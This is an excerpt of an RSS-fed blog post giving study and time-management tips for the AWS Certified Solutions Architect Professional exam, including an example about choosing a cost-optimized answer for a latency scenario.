&lt;p&gt;When facing a problem, the answers will gather a lot of services and methods to solve it. Your job is to choose the most suitable plan, only the most appropriate service is not enough.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#do-what-customers-ask"&gt;
  &lt;/a&gt;
  Do what customers ask
&lt;/h3&gt;

&lt;p&gt;There are widespread errors I have encountered. Each question will present many problems, and you must focus on only some of them: What the customer wants. These could be requests:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  How to optimize price?&lt;/li&gt;
&lt;li&gt;  How to reduce latency?&lt;/li&gt;
&lt;li&gt;  How to shorten the processing time?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Why is it a problem? Because the content of the question will be very rambling and make you think of its request in the wrong way.&lt;/p&gt;

&lt;p&gt;E.g., The customer has a website deployed in region us-east-1, using EC2 instance and Application Load Balancer, Auto Scaling Group. The website has about 1 million users worldwide. Customers find that users accessing from Asia will experience significant latency. Ask how to optimize the price?&lt;/p&gt;

&lt;p&gt;You can think of CloudFront with global access, high latency, and optimal price. However, CloudFront is not price-optimized too much, sometimes even increasing costs, while customer requirements are price-optimized. So you have to think about Spot Instances, Reserved Instances. So, your job is to choose the answer to the question, don't let other things distract you.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#time-management"&gt;
  &lt;/a&gt;
  Time management
&lt;/h3&gt;

&lt;p&gt;You have 170 minutes (or 200 minutes if you request as ESL) to solve 75 questions. However, the topic is very long. Furthermore, to the pressure of the exam, it is easy to get immersed in some difficult questions and waste a lot of time. Try to practice solving each question within 2 or 2.5 minutes. I will review the sentences marked with review the rest of the time.&lt;/p&gt;

&lt;p&gt;Also, do not mark the review too many. Should only keep the check under 20 sentences. For questions you don't know or think you can't answer, answer indiscriminately and don't look back; spend your precious time on questions that are more likely to earn points.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclude"&gt;
  &lt;/a&gt;
  Conclude
&lt;/h2&gt;

&lt;p&gt;The AWS Certified Solutions Architect --- Professional exam is challenging. You need a solid determination to overcome. But whether you pass or not, it doesn't matter; what matters is that you will gain various knowledge, which will help you in a real career path.&lt;/p&gt;

</description>
      <category>aws</category>
      <category>sapc01</category>
      <category>certification</category>
    </item>
  </channel>
</rss>
